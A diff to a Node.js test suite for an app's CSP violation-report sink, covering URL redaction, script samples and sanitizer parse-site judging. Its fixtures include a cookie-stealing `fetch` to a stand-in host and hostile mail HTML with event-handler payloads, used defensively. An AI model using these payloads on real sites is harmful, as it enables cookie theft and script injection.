@@ -85,7 +85,7 @@ const C = require(path.join(REPO, 'src/app-csp.js'));
 const SINK = require(path.join(REPO, 'src/server/csp-reports.js'));
 const { Auth } = require(path.join(REPO, 'src/auth.js'));
 let pass = 0, fail = 0;
-const ok = (c, n, e) => { if (c) { pass++; console.log('  ✓ ' + n); } else { fail++; console.error('  ✗ ' + n + (e !== undefined ? '\n    ' + (typeof e === 'string' ? e : JSON.stringify(e)).slice(0, 800) : '')); } };
+const ok = (c, n, e) => { if (typeof c !== 'boolean') throw new TypeError(`ok: its condition is a ${typeof c}, not a boolean — the arguments are swapped, or a value stands where a comparison belongs`); if (c) { pass++; console.log('  ✓ ' + n); } else { fail++; console.error('  ✗ ' + n + (e !== undefined ? '\n    ' + (typeof e === 'string' ? e : JSON.stringify(e)).slice(0, 800) : '')); } };
 // B-0d3e: a red control's product edit, its anchor judged BY NAME — any count but one (for 'all' / 'join' / 'first' or a /g
 // anchor: none) is a red row of this suite's own check naming the anchor and the file; the copy is then built as before (nothing
 // crashes). 'first' = an anchor the product holds more than once today: the first one is patched, as it always was
@@ -126,9 +126,9 @@ ok(C.HEADER === 'Content-Security-Policy-Report-Only' && C.ENFORCE_HEADER === 'C
 {
   const src = readRepo('src/app-csp.js');
   const cut = "  ['object-src', [\"'none'\"]],\n";
-  ok(src.includes(cut), 'the mutant anchor (the object-src row) is in src/app-csp.js');
+  ok(verdictOf(src.includes(cut)), 'the mutant anchor (the object-src row) is in src/app-csp.js');
   const M = load(path.join(REPO, 'src/app-csp.js'), editAnchor(src, cut, '', "src/app-csp.js"));
-  ok(pinFails(M.appPolicy()).some((f) => /^object-src/.test(f)), 'MUTANT (object-src \'none\' dropped) ⇒ RED: the pin names it', pinFails(M.appPolicy()));
+  ok(verdictOf(pinFails(M.appPolicy()).some((f) => /^object-src/.test(f))), 'MUTANT (object-src \'none\' dropped) ⇒ RED: the pin names it', pinFails(M.appPolicy()));
 }
 
 // ── ② A REPORT AS A LINE ──
@@ -137,10 +137,10 @@ const SECRET = 'tok-SECRET-7f3a';
 const report = (o = {}) => ({ 'csp-report': { 'document-uri': `http://127.0.0.1:1/?k=${SECRET}#${SECRET}`, referrer: `http://x/?r=${SECRET}`, 'violated-directive': 'img-src', 'effective-directive': 'img-src', 'original-policy': POLICY, disposition: 'report', 'blocked-uri': 'https://' + 'user:' + SECRET + '@cdn.example.net/a/b/c/d/e.png?sig=' + SECRET, /* user:pass built at run time (the secret scan) */ 'line-number': 12, 'column-number': 7, 'source-file': `http://127.0.0.1:1/bundle.js?v=${SECRET}`, 'status-code': 200, 'script-sample': `steal(${SECRET})`, ...o } });
 {
   const [r] = C.reportsOf(JSON.stringify(report()));
-  ok(r && r.directive === 'img-src' && r.blocked === 'https://cdn.example.net/a/b/c/…' && r.source === 'http://127.0.0.1:1/bundle.js' && r.line === 12 && r.column === 7 && r.document === 'http://127.0.0.1:1/', 'a URL is its origin + 3 path segments — no user:pass, no query, no fragment', r);
+  ok(gateOf(r) && r.directive === 'img-src' && r.blocked === 'https://cdn.example.net/a/b/c/…' && r.source === 'http://127.0.0.1:1/bundle.js' && r.line === 12 && r.column === 7 && r.document === 'http://127.0.0.1:1/', 'a URL is its origin + 3 path segments — no user:pass, no query, no fragment', r);
   ok(!JSON.stringify(r).includes(SECRET) && !('sample' in r) && !('referrer' in r) && !('original-policy' in r), 'no value in the line (the sample, the query, the referrer are not read)', r);
   const kw = C.reportsOf(JSON.stringify(report({ 'blocked-uri': 'inline', 'effective-directive': 'script-src-elem', 'source-file': 'about', 'document-uri': 'about' })))[0];
-  ok(kw && kw.blocked === 'inline' && kw.document === 'about', 'a keyword stays a keyword (inline, about)', kw);
+  ok(gateOf(kw) && kw.blocked === 'inline' && kw.document === 'about', 'a keyword stays a keyword (inline, about)', kw);
   ok(C.uriOf(`data:text/html,<script>${SECRET}</script>`) === 'data' && C.uriOf('chrome-extension://abcdefghijklmnop/x.js?q=1') === 'chrome-extension://abcdefghijklmnop' && C.uriOf('blob:http://h/uuid') === 'blob', 'a data: URL is its scheme; an extension is its id; a blob: URL its scheme');
   ok(C.reportsOf(JSON.stringify(report({ 'effective-directive': 'evil-src', 'violated-directive': 'evil-src' }))).length === 0, 'a directive outside the CSP vocabulary is dropped');
   // B-a35f (q-043 verify L4): a KEPT segment that looks like a token is cut to <token> — ≥ 16 of [A-Za-z0-9_-], any ≥ 32, the hub's own prefixes
@@ -156,7 +156,7 @@ const report = (o = {}) => ({ 'csp-report': { 'document-uri': `http://127.0.0.1:
   ok(!cutBad.length, `a kept path segment that looks like a token is cut to <token> (${CUTS.map((c) => c[2]).join('; ')})`, cutBad);
   const srcT = readRepo('src/app-csp.js'), cutT = ".map((g) => (TOKEN_SEGMENT.test(g) ? '<token>' : g))";
   const MT = srcT.split(cutT).length === 2 ? load(path.join(REPO, 'src/app-csp.js'), editAnchor(srcT, cutT, '', "src/app-csp.js")) : null;
-  ok(MT && MT.uriOf(CUTS[0][0]) === 'https://h.example.net/share/abcdEFGH1234_-xy/x', 'MUTANT (the segment cut dropped) ⇒ RED: the token is kept in the line', MT && MT.uriOf(CUTS[0][0]));
+  ok(gateOf(MT) && MT.uriOf(CUTS[0][0]) === 'https://h.example.net/share/abcdEFGH1234_-xy/x', 'MUTANT (the segment cut dropped) ⇒ RED: the token is kept in the line', MT && MT.uriOf(CUTS[0][0]));
   const rapi = C.reportsOf(JSON.stringify([{ type: 'csp-violation', body: { effectiveDirective: 'script-src-elem', blockedURL: 'eval', sourceFile: 'http://h/x.js', lineNumber: 3, documentURL: 'http://h/', disposition: 'report', sample: SECRET } }, { type: 'deprecation', body: {} }]));
   ok(rapi.length === 1 && rapi[0].blocked === 'eval' && rapi[0].line === 3 && !JSON.stringify(rapi).includes(SECRET), 'the Reporting-API shape (application/reports+json) reads the same, other report types skipped', rapi);
   ok(C.reportsOf('not json').length === 0 && C.reportsOf('{}').length === 0 && C.reportsOf(JSON.stringify(Array(50).fill({ type: 'csp-violation', body: { effectiveDirective: 'img-src', blockedURL: 'data' } }))).length === 20, 'not JSON / no report ⇒ nothing; at most 20 reports a post');
@@ -167,9 +167,9 @@ console.log('②b a script-src report\'s sample — kept only when asked for (a 
 {
   const attr = report({ 'effective-directive': 'script-src-attr', 'violated-directive': 'script-src-attr', 'blocked-uri': 'inline', 'source-file': '', 'line-number': 1, 'column-number': 101, 'script-sample': 'window.__xss=1' + 'x'.repeat(60) });
   const [plain] = C.reportsOf(JSON.stringify(attr)), [asked] = C.reportsOf(JSON.stringify(attr), { sample: true });
-  ok(plain && !('sample' in plain) && asked && asked.sample === ('window.__xss=1' + 'x'.repeat(60)).slice(0, C.SAMPLE_MAX) && C.SAMPLE_MAX === 40 && asked.line === 1 && asked.column === 101 && asked.source === '', 'a script-src-attr report: no sample by default; asked for, the handler\'s first 40 characters (the browser\'s own cut) beside its position', { plain, asked });
+  ok(gateOf(plain) && !('sample' in plain) && gateOf(asked) && asked.sample === ('window.__xss=1' + 'x'.repeat(60)).slice(0, C.SAMPLE_MAX) && C.SAMPLE_MAX === 40 && asked.line === 1 && asked.column === 101 && asked.source === '', 'a script-src-attr report: no sample by default; asked for, the handler\'s first 40 characters (the browser\'s own cut) beside its position', { plain, asked });
   const [img] = C.reportsOf(JSON.stringify(report()), { sample: true });
-  ok(img && !('sample' in img) && !JSON.stringify(img).includes(SECRET), 'an img-src report never carries a sample, asked or not (only code is sampled)', img);
+  ok(gateOf(img) && !('sample' in img) && !JSON.stringify(img).includes(SECRET), 'an img-src report never carries a sample, asked or not (only code is sampled)', img);
   const api = C.reportsOf(JSON.stringify([{ type: 'csp-violation', body: { effectiveDirective: 'script-src-elem', blockedURL: 'inline', sourceFile: '', lineNumber: 1, documentURL: 'http://h/', disposition: 'report', sample: 'alert(1)' } }]), { sample: true });
   ok(api.length === 1 && api[0].sample === 'alert(1)', 'the Reporting-API shape names its sample `sample` — read the same way', api);
   ok(C.lineKey({ ...asked, sample: 'a()' }) !== C.lineKey({ ...asked, sample: 'b()' }) && C.lineKey(plain) === C.lineKey({ ...asked, sample: undefined }), 'two handlers at one position are two lines in a suite\'s file; a line without a sample keys as it always did');
@@ -198,7 +198,7 @@ const FILE1 = path.join(D1, SINK.FILE);
   const H = await hub({ dir: D1 });
   const a = await post(H, report());
   ok(a.status === 204 && linesOf(FILE1).length === 1, 'a fake report ⇒ 204, ONE line in data/csp-reports.jsonl', { status: a.status, lines: linesOf(FILE1) });
-  ok(H.added.length === 1 && H.added[0].key === SINK.NOTICE_KEY && H.added[0].origin === 'server' && H.added[0].kind === 'notice' && /would block img-src: https:\/\/cdn\.example\.net/.test(H.added[0].text), 'the new pair files ONE For-you notice (origin server) naming the directive and what it would block', H.added);
+  ok(H.added.length === 1 && H.added[0].key === SINK.NOTICE_KEY && H.added[0].origin === 'server' && H.added[0].kind === 'notice' && verdictOf(/would block img-src: https:\/\/cdn\.example\.net/.test(H.added[0].text)), 'the new pair files ONE For-you notice (origin server) naming the directive and what it would block', H.added);
   ok(!fs.readFileSync(FILE1, 'utf8').includes(SECRET) && !JSON.stringify(H.added).includes(SECRET), 'no value in the file or the notice');
   ok((fs.statSync(FILE1).mode & 0o777) === 0o600, 'the file is 0600');
   const b = await post(H, report());
@@ -211,7 +211,7 @@ const FILE1 = path.join(D1, SINK.FILE);
   ok(after.status === 200, 'the routes after the sink still get their json body (the sink is its own reader)', after);
   const fr = await post(H, report({ 'document-uri': 'about', 'source-file': 'about', 'effective-directive': 'img-src', 'blocked-uri': 'http://tracker.example.net/p.gif?u=' + SECRET }));
   await post(H, report({ 'document-uri': 'blob', 'source-file': 'blob', 'effective-directive': 'script-src-elem', 'blocked-uri': 'inline' }));
-  ok(fr.status === 204 && linesOf(FILE1).length === 5 && H.added.length === 2 && linesOf(FILE1).filter((l) => l.document === 'about' || l.document === 'blob').every((l) => !l.noticed), 'a report from a frame the page made (a mail\'s tracker in a srcdoc frame, a blob: page) ⇒ a line, NO notice (the owner cannot act on it)', { lines: linesOf(FILE1).length, notices: H.added.length });
+  ok(fr.status === 204 && linesOf(FILE1).length === 5 && H.added.length === 2 && verdictOf(linesOf(FILE1).filter((l) => l.document === 'about' || l.document === 'blob').every((l) => !l.noticed)), 'a report from a frame the page made (a mail\'s tracker in a srcdoc frame, a blob: page) ⇒ a line, NO notice (the owner cannot act on it)', { lines: linesOf(FILE1).length, notices: H.added.length });
   const sum = H.sink.summary();
   ok(sum.policy === 'report-only' && sum.app.lines === 3 && sum.frames.lines === 2 && sum.frames.reports === 2 && sum.app.reports === 4 && sum.noticed === 2, 'the count: the app page\'s lines / reports apart from the frames\' (what the Diagnostics chip shows)', sum);
   const g = await new Promise((resolve) => http.get({ host: '127.0.0.1', port: H.port, path: '/api/csp-reports' }, (x) => { let d = ''; x.on('data', (c) => { d += c; }); x.on('end', () => resolve({ status: x.statusCode, json: JSON.parse(d) })); }));
@@ -277,11 +277,11 @@ console.log('③d a handler the sanitizer\'s inert parse set and dropped is `san
     const appWrite = writes.find(([l, c]) => { const p = own.get(`${l}:${c}`); return p && /src\/lib\/file-viewer\.js$/.test(p.source); });
     builds[name] = { js, site: sites[0], appWrite, inputs: Object.keys(r.metafile.inputs) };
   }
-  ok(builds.suites.site && builds.suites.site[1] === 35 && /^ +doc\d* = new DOMParser\d*\(\)\.$/.test(builds.suites.js.split('\n')[builds.suites.site[0] - 1].slice(0, 34)), 'the suites\' build spells the parse as Chrome 156 named it on the runner (bundle.js L:35 — measured 127564:35, the `parseFromString` of `doc = new DOMParser().parseFromString(…)`)', builds.suites.site);
+  ok(gateOf(builds.suites.site) && builds.suites.site[1] === 35 && verdictOf(/^ +doc\d* = new DOMParser\d*\(\)\.$/.test(builds.suites.js.split('\n')[builds.suites.site[0] - 1].slice(0, 34))), 'the suites\' build spells the parse as Chrome 156 named it on the runner (bundle.js L:35 — measured 127564:35, the `parseFromString` of `doc = new DOMParser().parseFromString(…)`)', builds.suites.site);
   {
     const src = readRepo('src/app-csp.js');
     const sig = /^const PURIFY_PARSE = \/.*\/;$/m;
-    ok(sig.test(src), 'the mutant anchor (the parse signature, PURIFY_PARSE) is in src/app-csp.js');
+    ok(verdictOf(sig.test(src)), 'the mutant anchor (the parse signature, PURIFY_PARSE) is in src/app-csp.js');
     const M = load(path.join(REPO, 'src/app-csp.js'), editAnchor(src, sig, 'const PURIFY_PARSE = /^parseFromString\\(/;', "src/app-csp.js"));
     const loose = M.purifyParseSites(builds.release.js);
     ok(loose.length > 1, `MUTANT (the signature cut to the call alone) ⇒ RED: ${loose.length} sites — the docx viewer's parse would be called the sanitizer's`, loose);
@@ -297,7 +297,7 @@ console.log('③d a handler the sanitizer\'s inert parse set and dropped is `san
   const CHAT = handler('fetch(\'//x.example/\'+document.cookie)', builds.suites.site); // an agent's markdown in the chat — the same one parse
   const CONTROL = handler('window.__pwned=14', builds.suites.appWrite);        // the SAME attribute set by OUR code (file-viewer's innerHTML)
   const [md] = C.reportsOf(JSON.stringify(MD), { site: true }), [ctl] = C.reportsOf(JSON.stringify(CONTROL), { site: true });
-  ok(md && md.site && md.site.script === '/bundle.js' && md.site.v === V && md.site.line === builds.suites.site[0] && md.site.column === builds.suites.site[1] && !('sample' in md) && ctl && ctl.site, 'reportOf(…, { site: true }) keeps WHERE a candidate was set (the build, line, column — numbers) and still no sample', md);
+  ok(gateOf(md) && gateOf(md.site) && md.site.script === '/bundle.js' && md.site.v === V && md.site.line === builds.suites.site[0] && md.site.column === builds.suites.site[1] && !('sample' in md) && gateOf(ctl) && verdictOf(ctl.site), 'reportOf(…, { site: true }) keeps WHERE a candidate was set (the build, line, column — numbers) and still no sample', md);
   const siteless = [
     ['no sample (not a handler\'s code)', handler('', builds.suites.site)],
     ['another origin\'s bundle.js', handler('window.__pwned=14', builds.suites.site, { 'source-file': `http://evil.example/bundle.js?v=${V}` })],
@@ -305,13 +305,13 @@ console.log('③d a handler the sanitizer\'s inert parse set and dropped is `san
     ['an inline script (script-src-elem)', handler('window.__pwned=14', builds.suites.site, { 'effective-directive': 'script-src-elem', 'violated-directive': 'script-src-elem' })],
     ['a frame the page made (document about)', handler('window.__pwned=14', builds.suites.site, { 'document-uri': 'about' })],
   ];
-  for (const [why, r] of siteless) { const [x] = C.reportsOf(JSON.stringify(r), { site: true }); ok(x && !x.site, `not a candidate: ${why}`, x); }
+  for (const [why, r] of siteless) { const [x] = C.reportsOf(JSON.stringify(r), { site: true }); ok(gateOf(x) && !x.site, `not a candidate: ${why}`, x); }
   // a MAIL: its body reaches the frame's DOMPurify only through mail-frame step 1, the allowlist re-serializer — no handler
   // survives it, so the mail frame's parse never sets one (measured: 0 reports on Chrome 156); were one to reach it, it is
   // the same parse site (ONE DOMPurify in the bundle — the symbol map above), so the same kind
   const HOSTILE_MAIL = '<p>Invoice</p><img src=x onerror="window.__mail=1"><a href="https://x.example/" onclick="window.__mail=2">pay</a><div ONMOUSEOVER=window.__mail=3>y</div><svg onload=window.__mail=4></svg>';
   const step1 = MF.sanitizeMailHtml(HOSTILE_MAIL, {});
-  ok(step1.ok && !/\son[a-z]+\s*=/i.test(step1.html) && !step1.html.includes('__mail'), 'a hostile MAIL: mail-frame step 1 drops every handler before DOMPurify ever parses it (no report can come from the mail frame)', step1.html);
+  ok(gateOf(step1.ok) && !/\son[a-z]+\s*=/i.test(step1.html) && !step1.html.includes('__mail'), 'a hostile MAIL: mail-frame step 1 drops every handler before DOMPurify ever parses it (no report can come from the mail frame)', step1.html);
   // THROUGH THE SINK: a hub's own data/ (no sample kept — the kind is judged, the sample never written) and a suite's file
   const DH = path.join(ROOT, 'sanitizer', 'hub', 'data'); fs.mkdirSync(DH, { recursive: true });
   const FH = path.join(DH, SINK.FILE);
@@ -326,7 +326,7 @@ console.log('③d a handler the sanitizer\'s inert parse set and dropped is `san
     ok(sum1.sanitizer.lines === 1 && sum1.sanitizer.reports === 2 && sum1.app.lines === 0 && sum1.app.reports === 0 && sum1.noticed === 0, 'the count: the sanitizer\'s own (1 line, 2 reports) — never the app page\'s, the count that says whether the policy is complete', sum1);
     const c = await post(H, CONTROL);
     const l2 = linesOf(FH);
-    ok(c.status === 204 && l2.length === 2 && !l2[1].kind && l2[1].noticed === true && H.added.length === 1 && /would block script-src-attr: inline/.test(H.added[0].text), 'CONTROL: the same attribute set by OUR code (file-viewer\'s innerHTML, the same sample) ⇒ a line of the app page and its ONE For-you notice', { l2, notices: H.added.map((x) => x.text) });
+    ok(c.status === 204 && l2.length === 2 && !l2[1].kind && l2[1].noticed === true && H.added.length === 1 && verdictOf(/would block script-src-attr: inline/.test(H.added[0].text)), 'CONTROL: the same attribute set by OUR code (file-viewer\'s innerHTML, the same sample) ⇒ a line of the app page and its ONE For-you notice', { l2, notices: H.added.map((x) => x.text) });
     const st = H.sink.stats();
     ok(st.sanitizer === 2 && H.sink.summary().app.lines === 1, 'stats: two reports judged the sanitizer\'s; the control counts on the app page', st);
     await H.close();
@@ -418,13 +418,13 @@ console.log('③d a handler the sanitizer\'s inert parse set and dropped is `san
     const pending = esSteps.map(({ o }) => (o.entryPoints[0] === rel.entryPoints[0] ? null // the client: ③d's release build
       : esbuild.build({ ...o, entryPoints: [path.join(REPO, o.entryPoints[0])], outfile: path.join(REPO, o.outfile), absWorkingDir: REPO, sourcemap: 'external', sourcesContent: false, metafile: true, write: false, logLevel: 'silent' })));
     // the one served script no esbuild CLI step makes: noVNC (scripts/build-novnc.mjs — patched in its own esbuild call)
-    ok(steps.includes('node scripts/build-novnc.mjs'), 'the build\'s other served script is scripts/build-novnc.mjs (public/novnc.js)', steps);
+    ok(verdictOf(steps.includes('node scripts/build-novnc.mjs')), 'the build\'s other served script is scripts/build-novnc.mjs (public/novnc.js)', steps);
     const novncOut = path.join(ROOT, 'census', 'novnc.js'); fs.mkdirSync(path.dirname(novncOut), { recursive: true });
     const nb = spawnSync(process.execPath, [path.join(REPO, 'scripts/build-novnc.mjs'), novncOut], { cwd: REPO, encoding: 'utf8' });
-    ok(nb.status === 0 && fs.existsSync(novncOut), 'scripts/build-novnc.mjs built public/novnc.js\'s bytes into the scratch dir', (nb.stderr || '').slice(0, 400));
+    ok(nb.status === 0 && verdictOf(fs.existsSync(novncOut)), 'scripts/build-novnc.mjs built public/novnc.js\'s bytes into the scratch dir', (nb.stderr || '').slice(0, 400));
     const rows = []; // { served, dompurify (null: no metafile), sites, js, map }
     for (const [i, { step, o }] of esSteps.entries()) {
-      ok(/^public\/[\w.-]+\.js$/.test(o.outfile || ''), `the build step ${o.entryPoints[0]} writes a served script (${o.outfile})`, step);
+      ok(verdictOf(/^public\/[\w.-]+\.js$/.test(o.outfile || '')), `the build step ${o.entryPoints[0]} writes a served script (${o.outfile})`, step);
       const served = '/' + String(o.outfile).slice('public/'.length);
       if (!pending[i]) {
         ok(JSON.stringify(SYM.flagsOf(o)) === JSON.stringify(SYM.flagsOf(rel)), 'the census reads the client step as ③d\'s release build', step);
@@ -443,7 +443,7 @@ console.log('③d a handler the sanitizer\'s inert parse set and dropped is `san
     /** what a table gets wrong against the census: a script with a parse site missing from it, a row with none */
     const tableFails = (table) => [...carry.filter((x) => !table.includes(x)).map((x) => `${x} embeds a DOMPurify and is NOT in the table`), ...table.filter((x) => !carry.includes(x)).map((x) => `${x} is in the table and its build has no DOMPurify parse`)];
     const TABLE = C.PARSE_SCRIPTS || [];
-    ok(Object.isFrozen(C.PARSE_SCRIPTS) && tableFails(TABLE).length === 0 && carry.includes('/bundle.js') && carry.includes('/mermaid.js'), `THE TABLE (app-csp PARSE_SCRIPTS ${JSON.stringify(C.PARSE_SCRIPTS)}) = the served scripts whose build carries a DOMPurify: ${carry.join(', ')}`, tableFails(TABLE));
+    ok(gateOf(Object.isFrozen(C.PARSE_SCRIPTS)) && tableFails(TABLE).length === 0 && gateOf(carry.includes('/bundle.js')) && verdictOf(carry.includes('/mermaid.js')), `THE TABLE (app-csp PARSE_SCRIPTS ${JSON.stringify(C.PARSE_SCRIPTS)}) = the served scripts whose build carries a DOMPurify: ${carry.join(', ')}`, tableFails(TABLE));
     // mermaid.js's site, pinned on ITS symbol map (as ③d pins the bundle's): every parseFromString call in it, named
     const mer = rows.find((x) => x.served === '/mermaid.js');
     const mCalls = posOf(mer.js, allAt(mer.js, '.parseFromString(', 1));
@@ -466,7 +466,7 @@ console.log('③d a handler the sanitizer\'s inert parse set and dropped is `san
     const mSame = sameLine(mer.js, mSite); // …and on the parse's own line, another column (r2)
     const PROBE = handler(LABEL, mSite, from('/mermaid.js', VM));
     const [pr] = C.reportsOf(JSON.stringify(PROBE), { site: true });
-    ok(VB !== VM && mOther && pr && pr.site && pr.site.script === '/mermaid.js' && pr.site.v === VM && pr.site.line === mSite[0] && pr.site.column === mSite[1] && !('sample' in pr), 'reportOf(…, { site: true }) names WHICH script set it — /mermaid.js, its own ?v= (not the bundle\'s), line, column — and still no sample', { pr, VB, VM, mOther });
+    ok(VB !== VM && gateOf(mOther) && gateOf(pr) && gateOf(pr.site) && pr.site.script === '/mermaid.js' && pr.site.v === VM && pr.site.line === mSite[0] && pr.site.column === mSite[1] && !('sample' in pr), 'reportOf(…, { site: true }) names WHICH script set it — /mermaid.js, its own ?v= (not the bundle\'s), line, column — and still no sample', { pr, VB, VM, mOther });
     let n = 0;
     const judge = async (body, o = {}) => {
       const D = path.join(ROOT, 'mermaid', String(++n), 'data'); fs.mkdirSync(D, { recursive: true });
@@ -496,14 +496,14 @@ console.log('③d a handler the sanitizer\'s inert parse set and dropped is `san
     // the shape Chrome 156 posts (measured, r2 — repro/r2/redirect-probe.mjs under the app's own policy): source-file with
     // NO query, for a classic script, a module and a redirected module alike ⇒ no stamp to read: the file on disk is judged
     CASES.push(['the report as Chrome 156 posts it — source-file /mermaid.js with no ?v= (Chrome drops the query) ⇒ judged against the file on disk: the sanitizer\'s', handler(LABEL, mSite, { 'source-file': `${ORIGIN}/mermaid.js` }), SANITIZER]);
-    for (const [why, body, want] of CASES) { const j = await judge(body); ok(want(j), why, j); }
+    for (const [why, body, want] of CASES) { const j = await judge(body); ok(verdictOf(want(j)), why, j); }
     {
       // no mermaid.js on disk (a public/ with the bundle only): its report keeps the notice, the bundle's is still judged
       const P2 = path.join(ROOT, 'mermaid', 'bundle-only', 'public'); fs.mkdirSync(P2, { recursive: true });
       fs.copyFileSync(BUNDLE, path.join(P2, 'bundle.js'));
       const VB2 = String(Math.floor(fs.statSync(path.join(P2, 'bundle.js')).mtimeMs));
       const a = await judge(PROBE, { publicDir: P2 }), b = await judge(handler(LABEL, bSite, from('/bundle.js', VB2)), { publicDir: P2 });
-      ok(APP(a) && SANITIZER(b), 'no mermaid.js on disk ⇒ its report is what it always was (a line + its notice); the bundle beside it is still judged', { a, b });
+      ok(gateOf(APP(a)) && verdictOf(SANITIZER(b)), 'no mermaid.js on disk ⇒ its report is what it always was (a line + its notice); the bundle beside it is still judged', { a, b });
     }
     {
       // THE PER-SCRIPT CACHE (r2 — each case above is a fresh hub, the two stamps an hour apart, so ONE slot keyed by the
@@ -535,7 +535,7 @@ console.log('③d a handler the sanitizer\'s inert parse set and dropped is `san
       ok(cut.length === 1 && cut[0] === '/mermaid.js embeds a DOMPurify and is NOT in the table', `MUTANT (/mermaid.js cut from the table) ⇒ RED by name: «${cut.join('; ')}»`, cut);
       const MS = load(path.join(MD, 'server', 'csp-reports.js'), readRepo('src/server/csp-reports.js')); // its require('../app-csp.js') = the mutant
       const j = await judge(PROBE, { sinkModule: MS });
-      ok(APP(j), 'MUTANT (/mermaid.js cut from the table) ⇒ RED: behind the real sink\'s code the hostile diagram\'s report files a For-you notice again', j);
+      ok(verdictOf(APP(j)), 'MUTANT (/mermaid.js cut from the table) ⇒ RED: behind the real sink\'s code the hostile diagram\'s report files a For-you notice again', j);
     }
     {
       // A HUB THAT MET THE BUG (r2 — the upgrade): .351–.361's judge (the table without /mermaid.js — the planted removal's
@@ -551,7 +551,7 @@ console.log('③d a handler the sanitizer\'s inert parse set and dropped is `san
       await post(H0, PROBE); await post(H0, handler(LABEL, mOther, from('/mermaid.js', VM)));
       await H0.close();
       const was = linesOf(FU);
-      ok(was.length === 2 && was.every((l) => !l.kind) && was[0].noticed === true && !was[1].noticed && openOf(store) === 1, 'the hub on the OLD judge: the probe\'s line the app page\'s, noticed, its notice open in For you (and an app line on another line of mermaid.js)', { was, open: openOf(store) });
+      ok(was.length === 2 && gateOf(was.every((l) => !l.kind)) && was[0].noticed === true && !was[1].noticed && openOf(store) === 1, 'the hub on the OLD judge: the probe\'s line the app page\'s, noticed, its notice open in For you (and an app line on another line of mermaid.js)', { was, open: openOf(store) });
       ok(Object.keys(was[0]).join() === 'at,directive,blocked,source,line,column,document,disposition,noticed', 'the old judge\'s line has the fields 2.369.361\'s shipped sink wrote, in its order (r3: measured on 5055b9ad6\'s own sink + store)', Object.keys(was[0]));
       store.stop(); // its debounced write flushed: what a hub on .361 left in data/
       const homes = {};
@@ -560,7 +560,7 @@ console.log('③d a handler the sanitizer\'s inert parse set and dropped is `san
       // For-you store made after it as server.js's top-level `const userTodos` is (the getter reads it at the boot's next
       // tick), NO rejudge() call; the one thing added: publicDir = this suite's build (the fast tier runs no npm run build)
       const SRV0 = readRepo('server.js'), sinkAt = SRV0.split('\n').filter((l) => l.startsWith('const cspReports = require('));
-      ok(sinkAt.length === 1 && SRV0.split("require('./src/server/csp-reports.js').create(").length === 2 && /^const userTodos = new UserTodoManager\(/m.test(SRV0) && !/\.rejudge\(/.test(SRV0), 'server.js makes the sink ONCE — the one boot call — and its For-you store at the top level after it; no other call starts the re-judge', sinkAt);
+      ok(sinkAt.length === 1 && SRV0.split("require('./src/server/csp-reports.js').create(").length === 2 && gateOf(/^const userTodos = new UserTodoManager\(/m.test(SRV0)) && !/\.rejudge\(/.test(SRV0), 'server.js makes the sink ONCE — the one boot call — and its For-you store at the top level after it; no other call starts the re-judge', sinkAt);
       const asServer = async (mod, home) => {
         const told = [], app = express(), log = { log: (x) => told.push(String(x)), warn: (x) => told.push(String(x)) };
         const req = (m) => (m === './src/server/csp-reports.js' ? { ...mod, create: (o) => mod.create({ ...o, publicDir: PUB }) } : require(m));
@@ -585,13 +585,13 @@ console.log('③d a handler the sanitizer\'s inert parse set and dropped is `san
       const seen = async (done, ms) => { const t0 = Date.now(); while (!done() && Date.now() - t0 < ms) await tick(5); return Date.now() - t0; };
       const until = (H, ms) => seen(() => H.sink.stats().rejudged, ms);
       const srcK = readRepo('src/server/csp-reports.js'), TRIG = ['  if (stale.length) setImmediate(rejudge);\n', '      rejudge(); // a hub that met the bug'];
-      ok(TRIG.every((t) => srcK.split(t).length === 2), 'the mutant\'s anchors: the re-judge\'s two triggers in the sink, the boot\'s setImmediate and the report\'s call');
+      ok(verdictOf(TRIG.every((t) => srcK.split(t).length === 2)), 'the mutant\'s anchors: the re-judge\'s two triggers in the sink, the boot\'s setImmediate and the report\'s call');
       const NB = load(path.join(REPO, 'src/server/csp-reports.js'), editAnchor(editAnchor(srcK, TRIG[0], '', "src/server/csp-reports.js"), TRIG[1], '      // cut', "src/server/csp-reports.js"));
       const [H1, HM] = await Promise.all([asServer(SINK, UH), asServer(NB, homes.mutant)]);
       const took = await until(H1, 3000); await tick(Math.max(25, took)); // the mutant has had twice what the real boot took
       const f1 = bootFault(H1), fm = bootFault(HM);
       ok(!f1, 'THE UPGRADE\'S FIRST BOOT, as server.js boots (its own sink line, NO rejudge() call): the probe\'s line re-judged the sanitizer\'s (`rejudged`, no `noticed`), its For-you notice CLOSED, Diagnostics\' «on the app page» down by it and the sanitizer\'s up; the other line stays the app page\'s; said once', f1);
-      ok(/NOT re-judged/.test(fm) && /For you still holds 1/.test(fm), `MUTANT (both triggers cut — the boot's setImmediate and the report's call) ⇒ RED by name: «${fm}»`, fm);
+      ok(gateOf(/NOT re-judged/.test(fm)) && verdictOf(/For you still holds 1/.test(fm)), `MUTANT (both triggers cut — the boot's setImmediate and the report's call) ⇒ RED by name: «${fm}»`, fm);
       await HM.close();
       await post(H1, PROBE);
       ok(linesOf(FU).length === 2 && openOf(H1.store) === 0, 'the same probe again ⇒ the sanitizer\'s, a duplicate: no line, no notice', { lines: linesOf(FU), open: openOf(H1.store) });
@@ -625,7 +625,7 @@ console.log('③d a handler the sanitizer\'s inert parse set and dropped is `san
       await Promise.all([until(HN, 3000), until(HT, 3000)]); await tick(25);
       const fN = bootFault(HN), fT = bootFault(HT), fX = bootFault(HX);
       ok(!fN && !fT, 'the store answers ⇒ the re-judge runs by itself (null: the boot\'s retry, no report; a throw: the next report) — the line the sanitizer\'s, its notice CLOSED, said once', { fN, fT });
-      ok(/rewritten with no store/.test(eX) && /For you still holds 1/.test(fX), `MUTANT (a store not up taken as an empty one — r2's null; judged once its rewrite is seen, ${HX.sink.stats().rejudged ? `at ${tX} ms` : `NOT in ${tX} ms`}) ⇒ RED by name: «${eX}», and once the store answers «${fX}»`, { eX, fX });
+      ok(gateOf(/rewritten with no store/.test(eX)) && verdictOf(/For you still holds 1/.test(fX)), `MUTANT (a store not up taken as an empty one — r2's null; judged once its rewrite is seen, ${HX.sink.stats().rejudged ? `at ${tX} ms` : `NOT in ${tX} ms`}) ⇒ RED by name: «${eX}», and once the store answers «${fX}»`, { eX, fX });
       await Promise.all([HN.close(), HT.close(), HX.close()]);
       // THE LINES FIRST, THE NOTICE LAST (r3): a file that cannot be rewritten (its temp name taken) closes nothing — its
       // line still the app page's, its notice open, a warning; the next boot (the way clear) does both
@@ -633,7 +633,7 @@ console.log('③d a handler the sanitizer\'s inert parse set and dropped is `san
       const HS = await lateBoot(SINK, homes.stuck, (st) => st);
       const rS = await HS.sink.rejudge(); // the boot's own run (one per boot)
